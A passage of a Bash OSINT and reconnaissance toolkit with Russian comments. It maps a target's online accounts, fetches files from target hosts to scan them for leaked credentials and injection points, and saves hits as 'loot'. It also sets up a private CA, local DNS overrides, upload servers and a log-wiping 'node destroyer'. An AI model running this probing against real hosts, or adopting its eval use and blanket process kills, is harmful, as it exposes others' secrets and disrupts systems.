            "COMMERCE") list_commerce="$list_commerce $service_name" ;;
        esac
    done

    # Инициализация структуры карты в Markdown-отчете
    echo -e "\n## СЕМАНТИЧЕСКАЯ КАРТА И ТОПОЛОГИЯ СВЯЗЕЙ" >> "$target_report"
    echo "--------------------------------------------------" >> "$target_report"
    echo "```" >> "$target_report"

    # Нативный раздельный вывод: красивый цветной на экран, чистый монохромный — в файл отчета
    echo -e "       [ ЯДРО ОБЪЕКТА ] ══════> (Идентификатор: ${G}$current_target${NC})"
    echo "       [ ЯДРО ОБЪЕКТА ] ══════> (Идентификатор: $current_target)" >> "$target_report"
    
    echo "               ║" && echo "               ║" >> "$target_report"

    if [[ -n $(echo "$list_social" | xargs) ]]; then
        echo "               ╠═══ [ Сектор: SOCIAL & MESSENGERS ]" >> "$target_report"
        echo "               ╠═══ [ Сектор: SOCIAL & MESSENGERS ]"
        for item in $list_social; do
            echo "               ║      ╚═══> ($item)" >> "$target_report"
            echo "               ║      ╚═══> ($item)"
        done
        echo "               ║" && echo "               ║" >> "$target_report"
    fi

    if [[ -n $(echo "$list_dev" | xargs) ]]; then
        echo "               ╠═══ [ Сектор: DEV & TECH INFRA ]" >> "$target_report"
        echo "               ╠═══ [ Сектор: DEV & TECH INFRA ]"
        for item in $list_dev; do
            echo "               ║      ╚═══> ($item)" >> "$target_report"
            echo "               ║      ╚═══> ($item)"
        done
        echo "               ║" && echo "               ║" >> "$target_report"
    fi

    if [[ -n $(echo "$list_blog" | xargs) ]]; then
        echo "               ╠═══ [ Сектор: BLOGS & FORUMS ]" >> "$target_report"
        echo "               ╠═══ [ Сектор: BLOGS & FORUMS ]"
        for item in $list_blog; do
            echo "               ║      ╚═══> ($item)" >> "$target_report"
            echo "               ║      ╚═══> ($item)"
        done
        echo "               ║" && echo "               ║" >> "$target_report"
    fi

    if [[ -n $(echo "$list_media" | xargs) ]]; then
        echo "               ╠═══ [ Сектор: MEDIA & STREAMING ]" >> "$target_report"
        echo "               ╠═══ [ Сектор: MEDIA & STREAMING ]"
        for item in $list_media; do
            echo "               ║      ╚═══> ($item)" >> "$target_report"
            echo "               ║      ╚═══> ($item)"
        done
        echo "               ║" && echo "               ║" >> "$target_report"
    fi

    echo "               ╚═══ [ Сектор: DESIGN, GAMING & FREELANCE ]" >> "$target_report"
    echo "               ╚═══ [ Сектор: DESIGN, GAMING & FREELANCE ]"
    for item in $list_design $list_gaming $list_commerce; do
        echo "                     ╚═══> ($item)" >> "$target_report"
        echo "                     ╚═══> ($item)"
    done

    echo "```" >> "$target_report"
    echo ""

    # Вывод критических зацепок на экран (Безопасный grep фиксированных строк)
    if [[ -f "$target_report" ]]; then
        grep -F "->" "$target_report" 2>/dev/null | head -n 10 | while read -r match_line; do
            echo "     [!] ВЫЯВЛЕНА СВЯЗЬ: $(echo "$match_line" | tr -d '*#')"
        done
    fi

    # ==========================================
    # ЭТАП 3: LOOT COLLECTOR (Архивация)
    # ==========================================
    echo "------------------------------------------------------------------"
    core_engine_ui "i" "[Этап 3/4] Компрессия данных в защищенный архив..."
    
    if (( found_artifacts > 0 )); then
        # Исключаем папку archives и сам формирующийся отчёт, чтобы упаковать только чистые логи
        (cd "$prime_loot_dir" && tar -czf "$archive_file" --exclude='archives' --exclude="nexus_report_*" *"${current_target}"* 2>/dev/null)
        core_engine_ui "s" "[+] Все файлы упакованы в: $(basename "$archive_file")"
    else
        core_engine_ui "w" "[!] Нет первичных файлов для компрессии."
    fi

    # ==========================================
    # ЭТАП 4: SESSION EXPORT (Выгрузка на накопитель)
    # ==========================================
    echo "------------------------------------------------------------------"
    core_engine_ui "i" "[Этап 4/4] Автоматический экспорт на внешний накопитель..."
    
    if [[ -d "$export_path" ]]; then
        if cp "$target_report" "$export_path/" 2>/dev/null && cp "$archive_file" "$export_path/" 2>/dev/null; then
            core_engine_ui "s" "[УСПЕХ] Все отчеты и архивы скопированы в: $export_path/"
        else
            # Если нет прав доступа к sdcard памяти смартфона
            local backup_export="$HOME/nexus_export"
            mkdir -p "$backup_export" 2>/dev/null
            cp "$target_report" "$backup_export/" 2>/dev/null
            cp "$archive_file" "$backup_export/" 2>/dev/null
            core_engine_ui "w" "[!] Ограничение прав Termux. Файлы выгружены локально: $backup_export/"
        fi
    else
        core_engine_ui "e" "[-] Внешний каталог $export_path не найден. Результаты сохранены в $prime_loot_dir"
    fi

    echo "------------------------------------------------------------------"
    core_engine_ui "s" "Конвейер полностью завершен! Сессия зафиксирована."
    core_engine_wait
}


# ==============================================================================
# @description: Вспомогательная функция глубокого анализа исходного кода
# ПОЛНАЯ АВТОНОМИЯ: Глобальный сигнатурный анализ (SAST CORE)
# ==============================================================================
run_deep_file_probe() {
    local host="$1"
    local target_file="$2"
    local passed_sample="$3" # Принимаем готовый семпл из родительского потока для GHOST_SPEED
    
    [[ -z "$host" || -z "$target_file" ]] && return

    # Если семпл не был передан из родительской функции, скачиваем его (безопасный откат)
    local sample="$passed_sample"
    if [[ -z "$sample" ]]; then
        sample=$(curl -s -k -L --max-time 5 --connect-timeout 3 "https://$host/$target_file" | head -c 2048 2>/dev/null)
    fi

    # Защита от пустых ответов / Стерилизация контура
    [[ -z "$sample" || "${#sample}" -lt 5 ]] && return

    local leaks=""
    local loot_dir="${PRIME_LOOT:-$HOME/prime_loot}"

   # 1. Эвристика: Поиск утечек СУБД / Конфигов (Индекс 0: Секреты и конфигурационные утечки)
    if echo "$sample" | grep -qiE "${GLOBAL_SAST_MATRIX[0]}" 2>/dev/null; then
        leaks+="${R}[!] DB_LEAK: Connection string, config environment or database credentials detected${NC}\n"
    fi
    
    # 2. Эвристика: Поиск точек входа / Веб-параметров (Индекс 1: Точки входа и API-инъекции)
    if echo "$sample" | grep -qiE "${GLOBAL_SAST_MATRIX[1]}" 2>/dev/null; then
        leaks+="${Y}[*] LOGIC: Entry point for data detected (Cross-Platform Web Inputs)${NC}\n"
    fi

     # 3. Эвристика: Поиск системных вызовов (RCE) (Индекс 2: RCE и исполнение команд)
        if echo "$sample" | grep -qiE "${GLOBAL_SAST_MATRIX[2]}" 2>/dev/null; then
            leaks+="${R}[!] RCE_RISK: System command execution detected (Critical Internal Call)${NC}\n"
        fi

  # 4. Эвристика: Поиск файловых операций / Инклудов (LFI) (Индекс 3: LFI, RFI и файловые операции)
    if echo "$sample" | grep -qiE "${GLOBAL_SAST_MATRIX[3]}" 2>/dev/null; then
        leaks+="${B}[i] LFI_RISK: File operations / Dynamic inclusion detected${NC}\n"
    fi
    
    # Фиксация результатов при обнаружении аномалий
    if [[ -n "$leaks" ]]; then
        # Красивый вывод отчета с сохранением оригинальных отступов фреймворка
        echo -e "      |--- ANALYSIS:\n$(echo -e "$leaks" | sed 's/^/      | /')"
        
        # Интеллектуальное вычисление оригинального расширения файла (env, sql, js, php)
        local ext="${target_file##*.}"
        # Если расширение не определилось или совпадает с именем файла, ставим безопасный .bin / .txt
        [[ "$ext" == "$target_file" || -z "$ext" ]] && ext="bin"
        
        # Санитизация имени для сохранения на диск (замена слешей на подчеркивания)
        local sanitized_name="${target_file//\//_}"
        
        mkdir -p "$loot_dir" 2>/dev/null
        
        # Сохраняем артефакт с сохранением его подлинного расширения
        echo "$sample" > "$loot_dir/probe_${sanitized_name}_$(date +%s).${ext}" 2>/dev/null
    fi
}




# ==============================================================================
# @description: OSINT NEXUS v24.6 - INTELLIGENT FORENSIC LOG DISPATCHER
# @status: SYS-FUSE INTEGRATED | PARSING & HIGHLIGHTING ENGINE READY
# ==============================================================================
run_view_loot() {
    core_engine_ui "h" "FORENSIC HARVESTER: INTELLIGENT ARTIFACT VIEW"

    # Слой 2: Индексация защищенного хранилища
    local base_loot="${PRIME_LOOT:-${BASE_DIR:-./}/prime_loot}"
    [[ ! -d "$base_loot" ]] && { core_engine_ui "e" "Storage unreachable."; core_engine_wait; return 1; }

    local files=()
    while IFS= read -r f; do
        [[ -n "$f" ]] && files+=("$f")
    done < <(find "$base_loot" -maxdepth 1 -type f -size +1c 2>/dev/null | sort)

    local total_files=${#files[@]}
    [[ $total_files -eq 0 ]] && { core_engine_ui "e" "No artifacts detected."; core_engine_wait; return 0; }

    # Слой 3: Отрисовка с индикацией критических файлов (через QUARANTINE_WHITELIST)
    core_engine_ui "i" "Artifact Index ($total_files):"
    printf "${C}%-4s %-35s %-12s %-15s${NC}\n" "ID" "ARTIFACT NAME" "SIZE" "MODIFIED"
    
    local i=0
    for file_name in "${files[@]}"; do
        ((i++))
        local b_name=$(basename "$file_name")
        # Интеграция с SYS-FUSE Layer 4: подсвечиваем системно важные файлы
        local status_mark=""
        if [[ "$b_name" =~ ${GLOBAL_SYSTEM_FUSE_MATRIX[3]} ]]; then
            status_mark="[PROTECTED]"
        fi
        
        printf " [%02d] %-35s %-12s %-15s %s\n" \
            "$i" "$b_name" "$(du -sh "$file_name" | awk '{print $1}')" \
            "$(date -r "$file_name" "+%Y-%m-%d %H:%M")" "$status_mark"
    done

    # Слой 4: Интерактив
    local target_id=$(core_engine_input "select" "Select Artifact ID to parse")
    [[ -z "$target_id" || "$target_id" =~ ^[bB]$ ]] && return 0

    if [[ ! "$target_id" =~ ^[0-9]+$ ]] || (( target_id < 1 || target_id > total_files )); then
        core_engine_ui "e" "Index out of bounds."
        core_engine_wait; return 1
    fi

    local selected_file="${files[$((target_id - 1))]}"
    
    # Слой 5: Безопасный стриминг через SAST-фильтры
    core_engine_ui "!" "Opening Pipeline: $(basename "$selected_file")"
    
    # Использование матриц для динамической подсветки
    # Мы комбинируем классические фильтры SED с паттернами из SAST-MATRIX
    local sed_cmd="sed -E 's/(${GLOBAL_SAST_MATRIX[0]})/\x1b[31;1m\1\x1b[0m/g; s/(${GLOBAL_SAST_MATRIX[2]})/\x1b[33;1m\1\x1b[0m/g'"

    echo -e "${D}=== FORENSIC STREAM START ===${NC}"
    eval "tail -n 100 '$selected_file' | $sed_cmd" 2>/dev/null
    echo -e "${D}=== FORENSIC STREAM END ===${NC}"

    core_engine_wait
}

# ==============================================================================
# @description: OSINT NEXUS v24.7 - INTEGRATED FINANCIAL INTELLIGENCE HUB
# @status: MULTI-MATRIX SYNC | BANK-IDENTITY MAPPING | API-ROUTING ENABLED
# ==============================================================================
run_iban_analyzer() {
    core_engine_ui "h" "FININT ENGINE: ULTIMATE BANKING IDENTITY & AUDIT"

    # Слой 2: Валидация фундамента
    core_engine_validator "pkg" "python3" "Python3 Engine" || { core_engine_wait; return 1; }

    # Слой 3: Выбор вектора
    core_engine_item "1" "FULL_AUDIT" "MOD97 + BANK-IDENTITY MAPPING + API VERIFY"
    core_engine_item "2" "FAST_SCAN"  "Pattern Detection (Global Finance Matrix)"
    local choice=$(core_engine_input "select" "Select Analysis Vector")
    [[ -z "$choice" || "$choice" == "b" || "$choice" == "B" ]] && return

    local target=$(core_engine_input "text" "Enter Target Identifier")
    [[ -z "$target" ]] && return 1
    
    local clean=$(echo "$target" | tr -d '[:space:].-' | tr '[:lower:]' '[:upper:]')

    # Исполнение в ОЗУ
    # Передаем: матрицы, узлы API и целевой идентификатор
    python3 - "$target" "$clean" "$choice" "${GLOBAL_FINANCE_MATRIX[@]}" "${GLOBAL_BANK_MATRIX[@]}" 2>/dev/null << 'EOF'
import sys
import re

raw = sys.argv[1]
clean = sys.argv[2]
mode = sys.argv[3]
# Разделяем матрицы: первые 6 элементов - это Finance, остальные - Bank
matrix_fin = sys.argv[4:10]
matrix_bank = sys.argv[10:]

def get_bank_info(code_or_swift):
    for entry in matrix_bank:
        parts = entry.split('|')
        if code_or_swift in parts[0] or code_or_swift in parts[1]:
            return f"{parts[2]} ({parts[3]})"
    return "Unknown Institution"

# Валидация IBAN
def validate_mod97(iban):
    try:
        rearranged = iban[4:] + iban[:4]
        numeric = "".join([str(ord(c)-55) if c.isalpha() else c for c in rearranged])
        return int(numeric) % 97 == 1
    except: return False

print(f" [+] Analyzing: {raw}")

# Режим 1: Глубокий аудит (IBAN + Identity Mapping)
if mode == "1":
    if validate_mod97(clean):
        print(" [s] MOD97 Integrity: PASS")
        # Извлекаем код банка для Франции (позиции 5-9)
        bank_id = clean[4:9]
        bank_name = get_bank_info(bank_id)
        print(f" [i] Identity Mapping: {bank_name}")
    else:
        print(" [!] MOD97 Integrity: FAILED (Corrupt Data)")

# Режим 2: Глобальный скан по матрицам
else:
    for i, pattern in enumerate(matrix_fin):
        if re.search(pattern, raw):
            print(f" [+] Layer {i} Match Found.")
EOF

    core_engine_wait
}

# --- Server Generating---

# --- PRIME IGNITION: RUN WITHOUT FILES ---


# --- CORE: DYNAMIC SSL PROVIDER ---
# --- CORE: DYNAMIC SSL PROVIDER ---
core_get_service_cert() {
    local service_name="$1"
    local cert_dir="/root/prime_certs"
    local trusted_cert="$cert_dir/${service_name}.pem"
    local ephemeral_cert="$HOME/prime_node.pem"

    # Убеждаемся, что директория существует
    mkdir -p "$cert_dir"

    # 1. ПРОВЕРКА/СОЗДАНИЕ ИНФРАСТРУКТУРЫ CA (Если нет ключей - создаем)
    if [[ ! -f "$cert_dir/myCA.key" || ! -f "$cert_dir/myCA.pem" ]]; then
        core_engine_ui "i" "Initializing new Root CA infrastructure..."
        openssl genrsa -out "$cert_dir/myCA.key" 2048 >/dev/null 2>&1
        openssl req -x509 -new -nodes -key "$cert_dir/myCA.key" -sha256 -days 3650 \
            -out "$cert_dir/myCA.pem" \
            -subj "/C=FR/ST=Auvergne-Rhone-Alpes/L=Lyon/O=PrimeNode/CN=PrimeRootCA" >/dev/null 2>&1
    fi

    # Инициализация серийного номера, если отсутствует
    if [[ ! -f "$cert_dir/myCA.srl" ]]; then
        echo "01" > "$cert_dir/myCA.srl"
    fi

    # 2. Если доверенный сертификат уже есть (подписанный нашим CA) - возвращаем его
    if [[ -f "$trusted_cert" ]]; then
        echo "$trusted_cert"
        return 0
    fi

    # 3. ЕСЛИ НЕТ ДОВЕРЕННОГО - ГЕНЕРИРУЕМ И ПОДПИСЫВАЕМ ЕГО
    # Сначала ключ и запрос для конкретного сервиса
    local service_key="$cert_dir/${service_name}.key"
    local service_csr="$cert_dir/${service_name}.csr"
    
    openssl genrsa -out "$service_key" 2048 >/dev/null 2>&1
    openssl req -new -key "$service_key" -out "$service_csr" \
        -subj "/CN=$service_name" >/dev/null 2>&1
        
    # Подписываем нашим CA
    openssl x509 -req -in "$service_csr" \
        -CA "$cert_dir/myCA.pem" -CAkey "$cert_dir/myCA.key" \
        -CAserial "$cert_dir/myCA.srl" -out "$trusted_cert" \
        -days 365 -sha256 >/dev/null 2>&1

    # Объединяем в .pem для Flask
    cat "$trusted_cert" "$service_key" > "$trusted_cert.tmp" && mv "$trusted_cert.tmp" "$trusted_cert"

    # Очистка временных файлов запроса
    rm -f "$service_csr" "$service_key"

    echo "$trusted_cert"
    return 0
}

# Эта функция регистрирует все ваши домены разом
update_all_dns_records() {
    local ip=$(hostname -I | awk '{print $1}')
    local conf_file="/etc/dnsmasq.d/prime_gateway.conf"

    # Создаем директорию
    mkdir -p /etc/dnsmasq.d/

    # Перезаписываем весь конфиг списком всех ваших доменов
    {
        echo "address=/app0.nexus/$ip"
        echo "address=/app1.nexus/$ip"
        echo "address=/app2.nexus/$ip"
        echo "address=/scanclamavnexus/$ip"
        echo "address=/kali.nexus/$ip"
        echo "address=/prime.portal/$ip"
        echo "address=/audit.nexus/$ip"
    } > "$conf_file"

    systemctl restart dnsmasq
    core_engine_ui "+" "DNS Registry: ALL domains synchronized to IP $ip"
}

run_live_service() {
    local service_type="$1"
    local port="${2:-8080}"
    local log_file="$HOME/prime_node.log"
    local protocol="http"

    core_engine_ui "h" "PRIME LIVE NODE: ${service_type^^}"

    # --- 1. АДАПТИВНАЯ СЕТЬ (ПРЯМОЙ IP-РЕЖИМ) ---
    # Мы пропускаем синхронизацию dnsmasq, так как работаем напрямую через IP.
    # Динамически перехватываем текущий IP-адрес сетевой карты (LAN)
    local lan_ip
    lan_ip=$(hostname -I 2>/dev/null | awk '{print $1}')
    
    # Резервный метод определения IP, если hostname -I не сработал
    if [[ -z "$lan_ip" ]]; then
        lan_ip=$(ip route get 1.1.1.1 2>/dev/null | awk '{print $7}')
    fi
    
    # Если устройство не подключено к сети
    if [[ -z "$lan_ip" ]]; then
        lan_ip="127.0.0.1"
        core_engine_ui "w" "Network disconnected. Using loopback mode."
    fi

    # Назначаем имя сервиса равным текущему IP-адресу для корректной работы логов
    local service_name="$lan_ip"

    # --- 2. ЭВРИСТИКА ПРОТОКОЛА (SSL Check) ---
    # Оставляем проверку на случай, если вы захотите поднять HTTPS на IP
    if command -v openssl >/dev/null 2>&1; then
        local active_cert
        active_cert=$(core_get_service_cert "$service_name" 2>/dev/null)
        
        if [[ -f "$active_cert" ]]; then
            protocol="https"
            export PRIME_CERT_PATH="$active_cert"
        fi
    fi

    # --- 3. САНИТАРИЯ ПОРТОВ ---
    core_engine_ui "i" "Sanitizing port $port..."
    fuser -k -n tcp -9 "$port" >/dev/null 2>&1
    pkill -9 -f "python3" >/dev/null 2>&1
    sleep 1.2

    # --- 4. ЗАПУСК ДВИЖКА ---
    local code_gen_func="generate_${service_type}_server_code_raw"
    if ! command -v "$code_gen_func" >/dev/null; then
        core_engine_ui "e" "Fatal: $code_gen_func not found."
        core_engine_wait; return
    fi

    local temp_service_file="/tmp/${service_type}_server.py"
    export PRIME_CERT_PATH="$active_cert"
    
    core_engine_ui "w" "Deploying $protocol engine on $service_name:$port..."
    export PRIME_LOOT PRIME_SHARE
    
    # Генерация сырого кода Flask
    "$code_gen_func" > "$temp_service_file"
    
    # Ограничения памяти (Защита NEXUS Core)
    ulimit -m 524288 2>/dev/null
    ulimit -v 1048576 2>/dev/null

    # Финальный фоновый запуск через nohup
    nohup nice -n 15 python3 "$temp_service_file" > "$log_file" 2>&1 &
    PID=$!
    
    core_engine_progress 2 "NODE_STABILIZATION"

    # --- 5. ФИНАЛЬНАЯ ДИАГНОСТИКА И ВЫВОД ССЫЛОК ---
    if lsof -Pi :"$port" -sTCP:LISTEN -t >/dev/null; then
        
        # Интерактивная матрица адресов. Теперь она показывает реальный живой IP!
        echo -e "\n\033[1;32m[+]\033[0m \033[1;36mNEXUS CORE ENGINE ONLINE (PID: $PID)\033[0m"
        echo -e "--------------------------------------------------------"
        echo -e "  \033[1;34m[>] LOCAL ACCESS :\033[0m  $protocol://127.0.0.1:${port}"
        echo -e "  \033[1;35m[>] LAN ACCESS   :\033[0m  \033[1;32m$protocol://${lan_ip}:${port}\033[0m  <-- КЛИКАТЬ СЮДА"
        echo -e "--------------------------------------------------------\n"
        
        # Запись в локальный лог трофеев
        core_engine_loot "node_startup" "Service ${service_type} deployed directly at $protocol://${lan_ip}:${port}"
    else
        core_engine_ui "e" "BOOT FAILURE. Analyzing crash logs..."
        core_engine_ui "line"

        if [[ -f "$log_file" ]]; then
            echo "[!] LAST 20 LINES OF LOG:"
            tail -n 20 "$log_file"
            core_engine_ui "line"
            
            if grep -q "Killed" "$log_file"; then
                echo "[CRITICAL] OOM Killer detected."
            elif grep -q "Traceback" "$log_file"; then
                echo "[ERROR] Python Exception Traceback detected."
            elif grep -q "Address already in use" "$log_file"; then
                echo "[ERROR] Port collision: Port $port is already in use."
            fi
        fi
    fi

    core_engine_wait
}

run_live_serviceold() {
    local service_type="$1"
    local port="${2:-8080}"
    local log_file="$HOME/prime_node.log"
    local cert_file="$HOME/prime_node.pem"
    local protocol="http"

    core_engine_ui "h" "PRIME LIVE NODE: ${service_type^^}"

    # --- 1. АДАПТИВНЫЙ DNS & IP ---
    # 1. Сначала подготавливаем сеть
    update_all_dns_records
    
    # Вызываем синхронизацию (она сама найдет лучший IP и обновит dnsmasq)
    core_network_dns_sync || core_engine_ui "w" "DNS Sync bypassed, using raw IP."
    
    # Эвристика домена: используем массив или case для назначения appN.nexus
    local service_name="app0.nexus" # Дефолт
    case "$service_type" in
        "av")      service_name="app0.nexus" ;;
        "scanner") service_name="app1.nexus" ;;
        "auth")    service_name="app2.nexus" ;;
        "aio")     service_name="app3.nexus" ;;
        *)         service_name="prime.portal" ;;
    esac

    # --- 2. ЭВРИСТИКА ПРОТОКОЛА (SSL Check) ---
    if command -v openssl >/dev/null 2>&1; then
        # Вызываем нашу динамическую функцию
        local active_cert
        active_cert=$(core_get_service_cert "$service_name")
        
        if [[ -f "$active_cert" ]]; then
            protocol="https"
            export PRIME_CERT_PATH="$active_cert"
            
            # Логируем тип сертификата
            if [[ "$active_cert" == *"/prime_certs/"* ]]; then
                core_engine_ui "s" "SSL: Trusted CA Mode active for $service_name"
            else
                core_engine_ui "w" "SSL: Ephemeral Mode active (Warning)"
            fi
        fi
    fi

    # --- 3. ГАРАНТИРОВАННАЯ ОЧИСТКА ---
    core_engine_ui "i" "Sanitizing port $port..."
    fuser -k -n tcp -9 "$port" >/dev/null 2>&1
    pkill -9 -f "python3" >/dev/null 2>&1
    sleep 1.2

    # --- 4. SMART IGNITION (Запуск через файл в /tmp) ---
    local code_gen_func="generate_${service_type}_server_code_raw"
    if ! command -v "$code_gen_func" >/dev/null; then
        core_engine_ui "e" "Fatal: $code_gen_func not found."
        core_engine_wait; return
    fi

    # Определяем путь к временному серверному файлу
    local temp_service_file="/tmp/${service_type}_server.py"

    # ЭКСПОРТИРУЕМ ПУТЬ К СЕРТИФИКАТУ В ОКРУЖЕНИЕ
    export PRIME_CERT_PATH="$active_cert"
    
    core_engine_ui "w" "Deploying $protocol engine on $service_name:$port..."
    export PRIME_LOOT PRIME_SHARE
    
    # Генерируем код сразу в файл
    "$code_gen_func" > "$temp_service_file"
    
    # --- [ИНТЕГРИРОВАННЫЙ БЛОК ЗАПУСКА NEXUS — ПОЛНОСТЬЮ ДИНАМИЧЕСКИЙ] ---
    # 1. Установка лимитов для предотвращения принудительного завершения ядром (OOM Killer)
    ulimit -m 524288 2>/dev/null
    ulimit -v 1048576 2>/dev/null

    # 2. Очистка динамического порта перед запуском (санитария)
    if fuser "$port"/tcp > /dev/null 2>&1; then
        echo "[!] Port $port busy. Cleaning..."
        fuser -k "$port"/tcp
        sleep 1
    fi

    # 3. Финальный запуск с защитой от разрыва сессии (nohup) и динамическим выводом адреса
    # ИСПРАВЛЕНО: Теперь адрес наружу генерируется динамически на основе параметров ноды
    echo "[+] Deploying NEXUS engine on ${service_name}:${port}..."
    nohup nice -n 15 python3 "$temp_service_file" > "$log_file" 2>&1 &

    # 4. Фиксация ID процесса для мониторинга
    PID=$!
    echo "[+] NEXUS Engine successfully deployed with PID: $PID"
    echo "[DEBUG] Service: $service_name | Port: $port | Protocol: $protocol"
    
    core_engine_progress 2 "NODE_STABILIZATION"

    # --- 5. ДИАГНОСТИКА & АВТО-ЛОГ ---
    if lsof -Pi :"$port" -sTCP:LISTEN -t >/dev/null; then
        local final_url="$protocol://$service_name:$port"
        core_engine_ui "s" "ADAPTIVE SERVICE ONLINE: $final_url"


        local final_url2="$protocol://$active_ip:$port"
        core_engine_ui "s" "ADAPTIVE SERVICE ONLINE: $final_url2"
        
        # 1. Регистрация в DNS
        core_network_dns_register "$service_name" "$active_ip"
    
        # --- ДИНАМИЧЕСКАЯ РЕГИСТРАЦИЯ В NGINX ---
        core_nginx_auto_setup "$service_name:$port"
       
        # Авто-регистрация в луте
        core_engine_loot "node_startup" "Service ${service_type} deployed & proxied at $final_url"
    else
      # 1. Регистрация в DNS
        core_network_dns_register "$service_name" "$active_ip"
    
        # --- ДИНАМИЧЕСКАЯ РЕГИСТРАЦИЯ В NGINX ---
        core_nginx_auto_setup "$service_name:$port"
       
        # Авто-регистрация в луте
        core_engine_loot "node_startup" "Service ${service_type} deployed & proxied at $final_url"
        
        core_engine_ui "e" "BOOT FAILURE. Analyzing crash logs..."
        core_engine_ui "line"

        if [[ -f "$log_file" ]]; then
            echo "[!] LAST 20 LINES OF LOG:"
            tail -n 20 "$log_file"
            
            core_engine_ui "line"
            
            # Экспертный поиск причины падения с учетом динамического порта
            if grep -q "Killed" "$log_file"; then
                echo "[CRITICAL] OOM Killer detected: Process was terminated due to memory pressure."
                echo "Check 'dmesg | grep -i oom' for system-wide memory exhaustion."
            elif grep -q "Traceback" "$log_file"; then
                echo "[ERROR] Python Exception Traceback detected:"
                grep -A 5 "Traceback" "$log_file"
            elif grep -q "Address already in use" "$log_file"; then
                echo "[ERROR] Port collision: Port $port is already in use by another process."
            else
                echo "[INFO] No specific crash signature found. Check log file for details."
            fi
        else
            echo "[!] Logs empty. Process never started."
        fi
    fi

    core_engine_wait
}

# --- STEALTH COMMS: NODE DESTROYER v1.0 ---
run_node_clean() {
    core_engine_ui "h" "NODE_DESTROY_SEQUENCE"
    
    # 1. Визуализация процесса аннигиляции
    core_engine_ui "w" "Scanning for active Live Nodes..."
    
    # Ищем порты, которые мы обычно используем (5000, 5001, 5002)
    local active_nodes=$(lsof -t -i:5000,5001,5002)
    
    if [[ -z "$active_nodes" ]]; then
        core_engine_ui "i" "No active nodes detected in this sector."
    else
        core_engine_ui "w" "Active nodes found. Initiating purge..."
        
        # 2. Жёсткое удаление процессов
        # Убиваем через fuser и pkill для верности
        fuser -k -n tcp -9 5000 5001 5002 >/dev/null 2>&1
        pkill -9 -f "python3" >/dev/null 2>&1
        
        core_engine_progress 1 "NODE_PURGE"
        core_engine_ui "s" "All nodes have been terminated."
    fi

    # 3. Очистка цифрового мусора (логи и кеш)
    core_engine_ui "i" "Wiping temporary traces..."
    rm -f "$HOME/prime_node.log" "/tmp/prime_node.log"
    
    core_engine_ui "s" "Sector is now clean."
    #core_engine_wait
}


run_av_server() {
    # Слой 1: Заголовок через Голос [1] (Адаптирован под реальный контекст ноды)
    core_engine_ui "PRIME SECURITY HUB: NETWORK SCANNER GATEWAY"

    # Слой 2: Валидация фундамента через Мозг [5]
    core_engine_validator "pkg" "python3" "Python3 Engine" || { core_engine_wait; return; }
    
    # ИСПРАВЛЕНО: Полностью удален блок проверки command -v clamscan и принудительной установки apt-get.
    # Сервер теперь разворачивается мгновенно, не требуя root-прав для установки пакетов.

    # Слой 3: Запуск через «Живой движок» (Live Node)
    # Используем обновленный динамический run_live_service для полной стерильности
    # Передаем тип "av" (основной движок ядра) и выделенный порт 5000
    run_live_service "av" "5000"
    
    # Слой 4: Интеграция в Сборщик трофеев [11]
    # ИСПРАВЛЕНО: Логирование отражает реальный статус запущенной подсистемы
    core_engine_loot "security" "NEXUS Core Analytical Gateway initiated on port 5000"
}

run_aio_server(){
#generate_aio_server_code_rawtest
    # Слой 1: Заголовок через Голос [1] (Адаптирован под реальный контекст ноды)
    core_engine_ui "PRIME SECURITY HUB: NETWORK SCANNER GATEWAY"

    # Слой 2: Валидация фундамента через Мозг [5]
    core_engine_validator "pkg" "python3" "Python3 Engine" || { core_engine_wait; return; }
    
    # ИСПРАВЛЕНО: Полностью удален блок проверки command -v clamscan и принудительной установки apt-get.
    # Сервер теперь разворачивается мгновенно, не требуя root-прав для установки пакетов.

    # Слой 3: Запуск через «Живой движок» (Live Node)
    # Используем обновленный динамический run_live_service для полной стерильности
    # Передаем тип "av" (основной движок ядра) и выделенный порт 5000
    run_live_service "aio" "5000"
    
    # Слой 4: Интеграция в Сборщик трофеев [11]
    # ИСПРАВЛЕНО: Логирование отражает реальный статус запущенной подсистемы
    core_engine_loot "security" "NEXUS Core Analytical Gateway initiated on port 5000"

}
run_share_server() {
    # Слой 1: Визуализация через Голос [1]
    core_engine_ui "SHARE SECTOR: SECURE FILE DISTRIBUTION"

    local share_dir="${HOME}/prime_share"
    
    # Слой 2: Подготовка инфраструктуры через Санитара [8]
    if [[ ! -d "$share_dir" ]]; then
        mkdir -p "$share_dir"
        core_engine_ui "i" "Created transmission sector at $share_dir"
    fi

    # Слой 3: Валидация фундамента через Мозг [5]
    core_engine_validator "pkg" "python3" "Python3 Engine" || { core_engine_wait; return; }

    # Слой 4: Динамический запуск через Live Node [22]
    # Используем тип "share" на порту 5002
    run_live_service "share" "5002"

    
    # Слой 5: Регистрация в Сборщике трофеев [11]
    core_engine_loot "service" "Share Sector (Uplink) active on port 5002"
}

run_upload_server() {
    # Слой 1: Визуализация через Голос [1]
    core_engine_ui "h" "INBOUND DROP BOX: SECURE UPLINK"

    # Слой 2: Валидация фундамента через Мозг [5]
    # Проверка наличия интерпретатора Python3 для запуска сервера
    core_engine_validator "pkg" "python3" "Python3 Engine" || { core_engine_wait; return; }

    # Слой 3: Динамический запуск через Live Node [22]
    # Запуск сервера на порту 5001 в режиме MEMORY_ONLY.
    # Код сервера передается через пайп, исключая создание .py файлов на диске.
    run_live_service "upload" "5001"


    
    # Слой 4: Регистрация в Сборщике трофеев [11]
    # Фиксация события запуска в системном логе
    core_engine_loot "service" "Secure Uplink (Upload) initiated on port 5001"
}

# ==============================================================================
# @description: OSINT NEXUS v23.8 - ZERO-DEPENDENCY BLUETOOTH MESH BRIDGE
# @status: ISOLATED AD-HOC BEACONING & ATOMIC JSON STREAM PARSING | PRODUCTION READY
# ==============================================================================
run_mesh_bridge() {
    # Слой 1: Заголовок и начальный статус через Голос [1]
    core_engine_ui "h" "PRIME MESH: AD-HOC COMMUNICATIONS v1.2"
    core_engine_ui "i" "Initializing Mesh Protocol Stack..."
    
    # Слой 2: Валидация фундамента через Мозг [5]
    core_engine_validator "pkg" "termux-api" "Termux:API" || { core_engine_wait; return 1; }
    core_engine_validator "pkg" "jq" "JSON Processor" || { core_engine_wait; return 1; }
    
    # Проверка аппаратного статуса Bluetooth-адаптера
    core_engine_ui "i" "Verifying hardware radio state..."
    if command -v termux-bluetooth-scan >/dev/null; then
        # Пробуем сделать тестовый скан; если адаптер выключен, API вернет ошибку или пустую строку
        if ! termux-bluetooth-scan -t 1 &>/dev/null; then
            core_engine_ui "w" "Bluetooth adapter is offline. Attempting automated power-on..."
